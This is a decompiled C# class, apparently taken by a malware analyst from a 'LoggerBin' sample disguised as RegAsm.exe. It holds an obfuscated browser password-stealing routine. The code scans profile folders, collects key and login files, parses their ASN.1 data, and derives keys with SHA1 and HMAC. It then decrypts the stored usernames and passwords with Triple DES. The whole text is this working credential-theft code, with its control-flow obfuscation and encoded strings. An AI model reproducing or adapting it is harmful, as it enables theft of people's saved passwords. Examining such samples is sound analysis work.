// Decompiled with JetBrains decompiler
// Type: h4.OZ
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using BH;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using oCN;
using rw;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace h4
{
  internal class OZ
  {
    public List<string> GetFiles;
    private static OZ THb;

    public List<NT> PN(string _param1)
    {
      List<NT> ntList1 = new List<NT>();
      try
      {
        foreach (string directory in Directory.GetDirectories(_param1))
        {
          try
          {
            string path = directory + w4.bx(5204, w4.vY);
            if (File.Exists(path))
            {
              OZ.VQ vq = new OZ.VQ();
              byte[] numArray1 = new byte[24];
              string str1 = path;
              Yxo axE = Yxo.axE;
              byte[] numArray2 = Yxo.bx((object) vq, str1, axE);
              string str2 = File.ReadAllText(directory + w4.bx(5224, w4.vY));
              this.GetFiles.Add(directory + w4.bx(5252, w4.vY));
              this.GetFiles.Add(directory + w4.bx(5204, w4.vY));
              this.GetFiles.Add(directory + w4.bx(5224, w4.vY));
              string[] separator = new string[1]
              {
                w4.bx(5272, w4.vY)
              };
              string[] strArray = str2.Split(separator, StringSplitOptions.None);
              int num = strArray.Length - 1;
              for (int index = 1; index <= num; ++index)
              {
                string str3 = WxH.bx((object) this, strArray[index], "", w4.bx(5300, w4.vY), WxH.vx7);
                string s1 = WxH.bx((object) this, strArray[index], w4.bx(5310, w4.vY), w4.bx(5354, w4.vY), WxH.vx7);
                string s2 = WxH.bx((object) this, strArray[index], w4.bx(5398, w4.vY), w4.bx(5442, w4.vY), WxH.vx7);
                OZ.Pj pj = new OZ.Pj();
                OZ.Et et1 = DxA.bx((object) pj, Convert.FromBase64String(s1), DxA.Rx4);
                OZ.Et et2 = DxA.bx((object) pj, Convert.FromBase64String(s2), DxA.Rx4);
                string input1 = Conversions.ToString(YxY.bx(numArray2, et1.ObjLists[0].ObjLists[1].ObjLists[1].Data, et1.ObjLists[0].ObjLists[2].Data, true, YxY.gxJ));
                string input2 = Conversions.ToString(YxY.bx(numArray2, et2.ObjLists[0].ObjLists[1].ObjLists[1].Data, et2.ObjLists[0].ObjLists[2].Data, true, YxY.gxJ));
                string str4 = Regex.Replace(input1, w4.bx(5460, w4.vY), "");
                string pattern = w4.bx(5460, w4.vY);
                string str5 = Regex.Replace(input2, pattern, "");
                List<NT> ntList2 = ntList1;
                NT nt = new NT();
                yJ.bx((object) nt, str3, yJ.qc);
                yJ.bx((object) nt, str4, yJ.rL);
                yJ.bx((object) nt, str5, yJ.aQ);
                ntList2.Add(nt);
              }
            }
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return ntList1;
    }

    public string Um(string _param1, string _param2, string _param3) => _param1.IndexOf(_param2) > -1 && _param1.IndexOf(_param3) > -1 ? Strings.Mid(_param1, _param1.IndexOf(_param2) + _param2.Length + 1, _param1.IndexOf(_param3) - _param1.IndexOf(_param2) - _param2.Length) : string.Empty;

    public OZ()
    {
      yd.bx(yd.EI);
      this.GetFiles = new List<string>();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool bHn() => OZ.THb == null;

    internal static OZ rHS() => OZ.THb;

    internal class Pj
    {
      private static OZ.Pj dHC;

      public OZ.Et Pb(byte[] _param1)
      {
        OZ.Et et = new OZ.Et();
        int num1 = _param1.Length - 1;
        for (int index = 0; index <= num1; ++index)
        {
          byte[] numArray1;
          int length1;
          int num2;
          switch ((OZ.Pj.PS) _param1[index])
          {
            case OZ.Pj.PS.Integerr:
              num2 = 2;
              goto label_2;
            case OZ.Pj.PS.OctetString:
              et.ObjLists.Add(new OZ.Et()
              {
                Type = OZ.Pj.PS.OctetString,
                Lenght = (int) _param1[index + 1]
              });
              numArray1 = new byte[(int) _param1[index + 1] - 1 + 1];
              if (numArray1.Length > _param1.Length - (index + 2))
              {
                length1 = _param1.Length - (index + 2);
                goto label_7;
              }
              else
              {
                length1 = numArray1.Length;
                num2 = 4;
                goto label_2;
              }
            case OZ.Pj.PS.ObjectIdentifier:
              et.ObjLists.Add(new OZ.Et()
              {
                Type = OZ.Pj.PS.ObjectIdentifier,
                Lenght = (int) _param1[index + 1]
              });
              byte[] numArray2 = new byte[(int) _param1[index + 1] - 1 + 1];
              int length2 = numArray2.Length <= _param1.Length - (index + 2) ? numArray2.Length : _param1.Length - (index + 2);
              Array.Copy((Array) _param1, index + 2, (Array) numArray2, 0, length2);
              et.ObjLists[OZ.Pj.JH2((object) et.ObjLists) - 1].Data = numArray2;
              index = index + 1 + et.ObjLists[et.ObjLists.Count - 1].Lenght;
              continue;
            case OZ.Pj.PS.Sequence:
              if (OZ.Pj.hHj())
              {
                num2 = 0;
                goto label_2;
              }
              else
                break;
            default:
              continue;
          }
label_1:
          int num3;
          num2 = num3;
label_2:
          int length3;
          byte[] numArray3;
          while (true)
          {
            switch (num2)
            {
              case 1:
                goto label_8;
              case 2:
                et.ObjLists.Add(new OZ.Et()
                {
                  Type = OZ.Pj.PS.Integerr,
                  Lenght = (int) _param1[index + 1]
                });
                numArray3 = new byte[(int) _param1[index + 1] - 1 + 1];
                if (numArray3.Length > _param1.Length - (index + 2))
                {
                  if (OZ.Pj.MHU() == null)
                  {
                    num2 = 3;
                    continue;
                  }
                  goto label_1;
                }
                else
                  goto label_12;
              case 3:
                length3 = _param1.Length - (index + 2);
                num2 = OZ.Pj.MHU() != null ? 5 : 5;
                continue;
              case 4:
                goto label_7;
              case 5:
                goto label_14;
              case 6:
                goto label_12;
              default:
                goto label_15;
            }
          }
label_8:
          et.ObjLists[et.ObjLists.Count - 1].Data = numArray1;
          index = index + 1 + et.ObjLists[et.ObjLists.Count - 1].Lenght;
          continue;
label_12:
          length3 = numArray3.Length;
label_14:
          Array.Copy((Array) _param1, index + 2, (Array) numArray3, 0, length3);
          et.ObjLists[et.ObjLists.Count - 1].Data = numArray3;
          index = index + 1 + et.ObjLists[et.ObjLists.Count - 1].Lenght;
          continue;
label_15:
          byte[] numArray4;
          if (et.Lenght != 0)
          {
            et.ObjLists.Add(new OZ.Et()
            {
              Type = OZ.Pj.PS.Sequence,
              Lenght = (int) _param1[index + 1]
            });
            numArray4 = new byte[(int) _param1[index + 1] - 1 + 1];
          }
          else
            goto label_27;
label_26:
          if (numArray4.Length > _param1.Length - (index + 2))
          {
            int length4 = _param1.Length;
          }
          else
          {
            int length5 = numArray4.Length;
          }
          Array.Copy((Array) _param1, index + 2, (Array) numArray4, 0, numArray4.Length);
          et.ObjLists.Add(DxA.bx((object) this, numArray4, DxA.mxZ));
          index = index + 1 + (int) _param1[index + 1];
          continue;
label_27:
          et.Type = OZ.Pj.PS.Sequence;
          et.Lenght = _param1.Length - (index + 2);
          numArray4 = new byte[et.Lenght - 1 + 1];
          goto label_26;
label_7:
          Array.Copy((Array) _param1, index + 2, (Array) numArray1, 0, length1);
          num2 = OZ.Pj.hHj() ? 1 : 1;
          goto label_2;
        }
        return et;
      }

      public Pj()
      {
        yd.bx(yd.EI);
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal static int JH2([In] object obj0) => ((List<OZ.Et>) obj0).Count;

      internal static bool hHj() => OZ.Pj.dHC == null;

      internal static OZ.Pj MHU() => OZ.Pj.dHC;

      internal enum PS
      {
        Integerr = 2,
        BitString = 3,
        OctetString = 4,
        Null = 5,
        ObjectIdentifier = 6,
        Sequence = 48, // 0x00000030
      }
    }

    internal class Et
    {
      public OZ.Pj.PS Type;
      public int Lenght;
      public List<OZ.Et> ObjLists;
      public byte[] Data;
      private static OZ.Et UHg;

      public Et()
      {
        yd.bx(yd.EI);
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.ObjLists = new List<OZ.Et>();
      }

      internal static bool SHo() => OZ.Et.UHg == null;

      internal static OZ.Et UHm() => OZ.Et.UHg;
    }

    internal class VQ
    {
      internal static OZ.VQ RHR;

      public byte[] Ka(string _param1)
      {
        try
        {
          OZ.Pj pj = new OZ.Pj();
          byte[] numArray1 = new byte[0];
          byte[] numArray2 = new byte[0];
          byte[] numArray3 = new byte[0];
          byte[] numArray4 = new byte[0];
          jxe.bx((object) this, _param1, ref numArray2, ref numArray1, w4.bx(5496, w4.vY), jxe.qxf);
          DxA.bx((object) pj, numArray1, DxA.Rx4);
          jxe.bx((object) this, _param1, ref numArray3, ref numArray4, w4.bx(5516, w4.vY), jxe.qxf);
          object Instance = (object) DxA.bx((object) pj, numArray3, DxA.Rx4);
          object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(Instance, (Type) null, w4.bx(5540, w4.vY), new object[1]
          {
            (object) 0
          }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, w4.bx(5540, w4.vY), new object[1]
          {
            (object) 0
          }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, w4.bx(5540, w4.vY), new object[1]
          {
            (object) 1
          }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, w4.bx(5540, w4.vY), new object[1]
          {
            (object) 0
          }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, w4.bx(5560, w4.vY), new object[0], (string[]) null, (Type[]) null, (bool[]) null));
          object objectValue2 = RuntimeHelpers.GetObjectValue(OZ.VQ.UHx(NewLateBinding.LateGet(OZ.VQ.UHx(Instance, (Type) null, (object) w4.bx(5540, w4.vY), (object) new object[1]
          {
            (object) 0
          }, (object) null, (object) null, (object) null), (Type) null, w4.bx(5540, w4.vY), new object[1]
          {
            (object) 1
          }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, (object) w4.bx(5560, w4.vY), (object) new object[0], (object) null, (object) null, (object) null));
          return Gxl.bx((object) this, numArray2, (byte[]) objectValue1, (byte[]) objectValue2, Gxl.Ixp);
        }
        catch (Exception ex)
        {
          return (byte[]) null;
        }
      }

      private byte[] sO(byte[] _param1, byte[] _param2, byte[] _param3)
      {
        try
        {
          object obj1 = (object) SHA1.Create(w4.bx(5572, w4.vY));
          int num1 = 11;
          object[] objArray1;
          object Instance1;
          bool[] CopyBack1;
          object obj2;
          object Instance2;
          object obj3;
          Type typeFromHandle1;
          string MemberName1;
          int num2;
          while (true)
          {
            int num3;
            object[] Arguments1;
            object Instance3;
            object Instance4;
            Type Type1;
            int num4;
            object objectValue1;
            byte[] array1;
            string MemberName2;
            byte[] array2;
            Type Type2;
            string MemberName3;
            object Instance5;
            Type[] TypeArguments1;
            object Instance6;
            string MemberName4;
            object Instance7;
            string MemberName5;
            object[] Arguments2;
            object[] Arguments3;
            object objectValue2;
            Type typeFromHandle2;
            object Instance8;
            Type typeFromHandle3;
            string MemberName6;
            Type typeFromHandle4;
            object[] Arguments4;
            object objectValue3;
            string[] ArgumentNames1;
            Type[] TypeArguments2;
            string[] ArgumentNames2;
            object Instance9;
            switch (num1)
            {
              case 1:
                goto label_30;
              case 2:
                Instance1 = OZ.VQ.zH5(objArray1[2]);
                goto label_8;
              case 3:
                string[] ArgumentNames3 = (string[]) null;
                Type[] TypeArguments3 = (Type[]) null;
                CopyBack1 = new bool[2]{ true, false };
                NewLateBinding.LateCall(Instance5, typeFromHandle3, MemberName6, Arguments4, ArgumentNames3, TypeArguments3, CopyBack1, true);
                if (CopyBack1[0])
                  goto label_38;
label_21:
                Instance7 = (object) null;
                num1 = 9;
                continue;
label_38:
                objectValue1 = RuntimeHelpers.GetObjectValue(objArray1[0]);
                goto label_21;
              case 4:
                Type typeFromHandle5 = Type.GetTypeFromHandle(lC0.q8qryK(16777254));
                string MemberName7 = w4.bx(5636, w4.vY);
                objArray1 = new object[5]
                {
                  RuntimeHelpers.GetObjectValue(objectValue2),
                  (object) 0,
                  RuntimeHelpers.GetObjectValue(Instance1),
                  (object) 20,
                  (object) 20
                };
                object[] Arguments5 = objArray1;
                string[] ArgumentNames4 = (string[]) null;
                Type[] TypeArguments4 = (Type[]) null;
                CopyBack1 = new bool[5]
                {
                  true,
                  false,
                  true,
                  false,
                  false
                };
                NewLateBinding.LateCall(Instance8, typeFromHandle5, MemberName7, Arguments5, ArgumentNames4, TypeArguments4, CopyBack1, true);
                num1 = 16;
                continue;
              case 5:
                object[] Arguments6 = objArray1;
                string[] ArgumentNames5 = (string[]) null;
                Type[] TypeArguments5 = (Type[]) null;
                CopyBack1 = new bool[5]
                {
                  true,
                  false,
                  true,
                  false,
                  false
                };
                NewLateBinding.LateCall(Instance7, typeFromHandle2, MemberName2, Arguments6, ArgumentNames5, TypeArguments5, CopyBack1, true);
                if (CopyBack1[0])
                  _param2 = (byte[]) Conversions.ChangeType(OZ.VQ.zH5(objArray1[0]), typeof (byte[]));
                if (CopyBack1[2])
                  objectValue1 = RuntimeHelpers.GetObjectValue(objArray1[2]);
                Instance9 = Instance3;
                Type2 = (Type) null;
                MemberName4 = w4.bx(5584, w4.vY);
                objArray1 = new object[1]
                {
                  RuntimeHelpers.GetObjectValue(objectValue1)
                };
                Arguments2 = objArray1;
                ArgumentNames2 = (string[]) null;
                TypeArguments2 = (Type[]) null;
                num1 = !OZ.VQ.TH3() ? 4 : 7;
                continue;
              case 6:
                NewLateBinding.LateCall(Instance6, typeFromHandle4, MemberName5, Arguments1, ArgumentNames1, TypeArguments1, CopyBack1, true);
                if (CopyBack1[0])
                  goto label_35;
label_34:
                Instance8 = (object) null;
                num3 = 4;
                break;
label_35:
                Instance1 = RuntimeHelpers.GetObjectValue(objArray1[0]);
                goto label_34;
              case 7:
                bool[] CopyBack2 = new bool[1]{ true };
                object obj4 = NewLateBinding.LateGet(Instance9, Type2, MemberName4, Arguments2, ArgumentNames2, TypeArguments2, CopyBack2);
                if (CopyBack2[0])
                  objectValue1 = RuntimeHelpers.GetObjectValue(objArray1[0]);
                objectValue2 = RuntimeHelpers.GetObjectValue(obj4);
                Instance6 = (object) null;
                typeFromHandle4 = Type.GetTypeFromHandle(lC0.q8qryK(16777254));
                MemberName5 = w4.bx(5620, w4.vY);
                objArray1 = new object[2]
                {
                  OZ.VQ.zH5(Instance1),
                  (object) 40
                };
                Arguments1 = objArray1;
                ArgumentNames1 = (string[]) null;
                TypeArguments1 = (Type[]) null;
                CopyBack1 = new bool[2]{ true, false };
                num1 = 6;
                continue;
              case 8:
                objArray1 = new object[2]
                {
                  RuntimeHelpers.GetObjectValue(objectValue1),
                  (object) 40
                };
                Arguments4 = objArray1;
                if (OZ.VQ.TH3())
                {
                  num1 = 3;
                  continue;
                }
                break;
              case 9:
                typeFromHandle2 = Type.GetTypeFromHandle(OZ.VQ.LHw(16777254));
                MemberName2 = w4.bx(5636, w4.vY);
                objArray1 = new object[5]
                {
                  (object) _param2,
                  (object) 0,
                  RuntimeHelpers.GetObjectValue(objectValue1),
                  (object) 20,
                  (object) 20
                };
                num1 = 5;
                continue;
              case 10:
                NewLateBinding.LateSet(Instance3, (Type) null, w4.bx(5610, w4.vY), new object[1]
                {
                  OZ.VQ.zH5(objectValue3)
                }, (string[]) null, (Type[]) null);
                object Instance10 = Instance3;
                Type Type3 = (Type) null;
                string MemberName8 = w4.bx(5584, w4.vY);
                object[] objArray2 = new object[1]
                {
                  (object) array2
                };
                object[] Arguments7 = objArray2;
                string[] ArgumentNames6 = (string[]) null;
                Type[] TypeArguments6 = (Type[]) null;
                CopyBack1 = new bool[1]{ true };
                object obj5 = NewLateBinding.LateGet(Instance10, Type3, MemberName8, Arguments7, ArgumentNames6, TypeArguments6, CopyBack1);
                if (CopyBack1[0])
                {
                  // ISSUE: type reference
                  array2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), OZ.VQ.UHI(__typeref (byte[])));
                }
                Instance1 = RuntimeHelpers.GetObjectValue(obj5);
                Array.Resize<byte>(ref array2, 20);
                Instance4 = Instance3;
                Type1 = (Type) null;
                MemberName3 = w4.bx(5584, w4.vY);
                objArray1 = new object[1]{ (object) array2 };
                Arguments3 = objArray1;
                if (OZ.VQ.LHZ() == null)
                {
                  num1 = 15;
                  continue;
                }
                break;
              case 11:
                object Instance11 = obj1;
                Type Type4 = (Type) null;
                string MemberName9 = w4.bx(5584, w4.vY);
                object[] objArray3 = new object[1]
                {
                  (object) _param1
                };
                object[] Arguments8 = objArray3;
                string[] ArgumentNames7 = (string[]) null;
                Type[] TypeArguments7 = (Type[]) null;
                CopyBack1 = new bool[1]{ true };
                object obj6 = NewLateBinding.LateGet(Instance11, Type4, MemberName9, Arguments8, ArgumentNames7, TypeArguments7, CopyBack1);
                if (CopyBack1[0])
                  _param1 = (byte[]) OZ.VQ.QHM(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (byte[]));
                array1 = (byte[]) obj6;
                Array.Resize<byte>(ref array1, 40);
                Array.Copy((Array) _param2, 0, (Array) array1, 20, 20);
                array2 = _param2;
                Array.Resize<byte>(ref array2, 40);
                num3 = 12;
                break;
              case 12:
                Array.Copy((Array) _param2, 0, (Array) array2, 20, 20);
                object Instance12 = obj1;
                Type Type5 = (Type) null;
                string MemberName10 = w4.bx(5584, w4.vY);
                objArray1 = new object[1]{ (object) array1 };
                object[] Arguments9 = objArray1;
                string[] ArgumentNames8 = (string[]) null;
                Type[] TypeArguments8 = (Type[]) null;
                CopyBack1 = new bool[1]{ true };
                object obj7 = NewLateBinding.LateGet(Instance12, Type5, MemberName10, Arguments9, ArgumentNames8, TypeArguments8, CopyBack1);
                if (CopyBack1[0])
                {
                  // ISSUE: type reference
                  array1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), OZ.VQ.UHI(__typeref (byte[])));
                }
                objectValue3 = RuntimeHelpers.GetObjectValue(obj7);
                Instance3 = OZ.VQ.SHk();
                num1 = 10;
                continue;
              case 13:
                int integer = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(Instance1, (Type) null, w4.bx(5648, w4.vY), new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) num4));
                obj2 = (object) new byte[integer - 1 + 1];
                object Instance13 = (object) null;
                Type typeFromHandle6 = Type.GetTypeFromHandle(lC0.q8qryK(16777254));
                string MemberName11 = w4.bx(5636, w4.vY);
                objArray1 = new object[5]
                {
                  RuntimeHelpers.GetObjectValue(Instance1),
                  (object) num4,
                  RuntimeHelpers.GetObjectValue(obj2),
                  (object) 0,
                  (object) integer
                };
                object[] Arguments10 = objArray1;
                string[] ArgumentNames9 = (string[]) null;
                Type[] TypeArguments9 = (Type[]) null;
                CopyBack1 = new bool[5]
                {
                  true,
                  true,
                  true,
                  false,
                  true
                };
                NewLateBinding.LateCall(Instance13, typeFromHandle6, MemberName11, Arguments10, ArgumentNames9, TypeArguments9, CopyBack1, true);
                if (CopyBack1[0])
                  Instance1 = RuntimeHelpers.GetObjectValue(objArray1[0]);
                if (CopyBack1[1])
                  goto label_44;
label_17:
                if (CopyBack1[2])
                  goto label_46;
label_25:
                if (CopyBack1[4])
                {
                  int num5 = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[4]), Type.GetTypeFromHandle(lC0.q8qryK(16777219)));
                }
                num2 = 24;
                obj3 = (object) new byte[num2 - 1 + 1];
                Instance2 = (object) null;
                typeFromHandle1 = Type.GetTypeFromHandle(OZ.VQ.LHw(16777254));
                MemberName1 = w4.bx(5636, w4.vY);
                num1 = OZ.VQ.TH3() ? 1 : 1;
                continue;
label_46:
                obj2 = OZ.VQ.zH5(objArray1[2]);
                goto label_25;
label_44:
                num4 = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[1]), Type.GetTypeFromHandle(OZ.VQ.LHw(16777219)));
                goto label_17;
              case 14:
                goto label_16;
              case 15:
                string[] ArgumentNames10 = (string[]) null;
                Type[] TypeArguments10 = (Type[]) null;
                CopyBack1 = new bool[1]{ true };
                object obj8 = NewLateBinding.LateGet(Instance4, Type1, MemberName3, Arguments3, ArgumentNames10, TypeArguments10, CopyBack1);
                if (CopyBack1[0])
                  array2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
                objectValue1 = RuntimeHelpers.GetObjectValue(obj8);
                Instance5 = (object) null;
                num1 = OZ.VQ.TH3() ? 0 : 0;
                continue;
              case 16:
                if (CopyBack1[0])
                  objectValue2 = RuntimeHelpers.GetObjectValue(objArray1[0]);
                if (CopyBack1[2])
                {
                  num1 = 2;
                  continue;
                }
                goto label_8;
              default:
                typeFromHandle3 = Type.GetTypeFromHandle(lC0.q8qryK(16777254));
                MemberName6 = w4.bx(5620, w4.vY);
                num3 = 8;
                break;
            }
            num1 = num3;
            continue;
label_8:
            num4 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(Instance1, (Type) null, w4.bx(5648, w4.vY), new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) 8));
            num1 = 13;
          }
label_16:
          obj3 = RuntimeHelpers.GetObjectValue(objArray1[2]);
          goto label_36;
label_30:
          objArray1 = new object[5]
          {
            RuntimeHelpers.GetObjectValue(Instance1),
            (object) 0,
            RuntimeHelpers.GetObjectValue(obj3),
            (object) 0,
            (object) num2
          };
          object[] Arguments11 = objArray1;
          string[] ArgumentNames11 = (string[]) null;
          Type[] TypeArguments11 = (Type[]) null;
          CopyBack1 = new bool[5]
          {
            true,
            false,
            true,
            false,
            true
          };
          NewLateBinding.LateCall(Instance2, typeFromHandle1, MemberName1, Arguments11, ArgumentNames11, TypeArguments11, CopyBack1, true);
          if (CopyBack1[0])
            goto label_43;
label_19:
          if (CopyBack1[2])
            goto label_16;
          else
            goto label_36;
label_43:
          RuntimeHelpers.GetObjectValue(objArray1[0]);
          goto label_19;
label_36:
          if (CopyBack1[4])
            goto label_42;
label_10:
          int num6 = 24;
          object obj9 = (object) new byte[num2 - 1 + 1];
          object Instance14 = (object) null;
          Type typeFromHandle7 = Type.GetTypeFromHandle(lC0.q8qryK(16777254));
          string MemberName12 = w4.bx(5636, w4.vY);
          object[] objArray4 = new object[5]
          {
            RuntimeHelpers.GetObjectValue(YxY.bx((byte[]) obj3, (byte[]) obj2, _param3, false, YxY.gxJ)),
            (object) 0,
            RuntimeHelpers.GetObjectValue(obj9),
            (object) 0,
            (object) num6
          };
          object[] Arguments12 = objArray4;
          string[] ArgumentNames12 = (string[]) null;
          Type[] TypeArguments12 = (Type[]) null;
          bool[] CopyBack3 = new bool[5]
          {
            false,
            false,
            true,
            false,
            true
          };
          NewLateBinding.LateCall(Instance14, typeFromHandle7, MemberName12, Arguments12, ArgumentNames12, TypeArguments12, CopyBack3, true);
          if (CopyBack3[2])
            obj9 = RuntimeHelpers.GetObjectValue(objArray4[2]);
          if (CopyBack3[4])
          {
            int num7 = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[4]), Type.GetTypeFromHandle(lC0.q8qryK(16777219)));
          }
          return (byte[]) obj9;
label_42:
          num2 = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[4]), Type.GetTypeFromHandle(lC0.q8qryK(16777219)));
          goto label_10;
        }
        catch (Exception ex)
        {
          return (byte[]) null;
        }
      }

      private void Bz(string _param1, ref byte[] _param2, ref byte[] _param3, string _param4)
      {
        Sh sh = new Sh(_param1);
        eN.bx((object) sh, _param4, eN.mD);
        string s1 = "";
        string s2 = "";
        if (Operators.CompareString(_param4, w4.bx(5496, w4.vY), false) != 0)
          goto label_5;
        else
          goto label_4;
label_2:
        _param2 = Encoding.Default.GetBytes(s1);
        _param3 = Encoding.Default.GetBytes(s2);
        return;
label_4:
        s1 = NO.bx((object) sh, 0, 1, NO.CxC);
        s2 = NO.bx((object) sh, 0, 2, NO.CxC);
        goto label_2;
label_5:
        if (Operators.CompareString(_param4, w4.bx(5516, w4.vY), false) == 0)
        {
          int num1 = 0;
          if (OZ.VQ.LHZ() != null)
            goto label_7;
label_1:
          switch (num1)
          {
            default:
              s1 = e9.bx((object) sh, 0, w4.bx(5664, w4.vY), e9.Lz);
              s2 = e9.bx((object) sh, 0, w4.bx(5674, w4.vY), e9.Lz);
              goto label_2;
          }
label_7:
          int num2;
          num1 = num2;
          goto label_1;
        }
        else
          goto label_2;
      }

      public VQ()
      {
        yd.bx(yd.EI);
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal static object UHx(
        [In] object obj0,
        [In] Type obj1,
        [In] object obj2,
        [In] object obj3,
        [In] object obj4,
        [In] object obj5,
        [In] object obj6) => NewLateBinding.LateGet(obj0, obj1, (string) obj2, (object[]) obj3, (string[]) obj4, (Type[]) obj5, (bool[]) obj6);

      internal static bool TH3() => OZ.VQ.RHR == null;

      internal static OZ.VQ LHZ() => OZ.VQ.RHR;

      internal static object QHM([In] object obj0, [In] Type obj1) => Conversions.ChangeType(obj0, obj1);

      internal static Type UHI([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

      internal static object SHk() => (object) HMAC.Create();

      internal static object zH5([In] object obj0) => RuntimeHelpers.GetObjectValue(obj0);

      internal static RuntimeTypeHandle LHw(int token) => lC0.q8qryK(token);
    }

    internal static class xK
    {
      private static OZ.xK SHq;

      public static object WWR(byte[] _param0, byte[] _param1, byte[] _param2, bool _param3)
      {
        byte[] buffer = new byte[512];
        using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
        {
          OZ.xK.YH8((object) cryptoServiceProvider, (object) _param0);
          cryptoServiceProvider.IV = _param1;
          OZ.xK.aHO((object) cryptoServiceProvider, CipherMode.CBC);
          cryptoServiceProvider.Padding = PaddingMode.None;
          ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
          using (MemoryStream memoryStream = new MemoryStream(_param2))
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
            {
              if (_param3)
              {
                using (StreamReader streamReader = new StreamReader((Stream) cryptoStream))
                  return (object) streamReader.ReadToEnd();
              }
              else
              {
                cryptoStream.Read(buffer, 0, buffer.Length);
                return (object) buffer;
              }
            }
          }
        }
      }

      internal static void YH8([In] object obj0, [In] object obj1) => ((SymmetricAlgorithm) obj0).Key = (byte[]) obj1;

      internal static void aHO([In] object obj0, [In] CipherMode obj1) => ((SymmetricAlgorithm) obj0).Mode = obj1;

      internal static bool JHQ() => OZ.xK.SHq == null;

      internal static OZ.xK oHi() => OZ.xK.SHq;
    }
  }
}
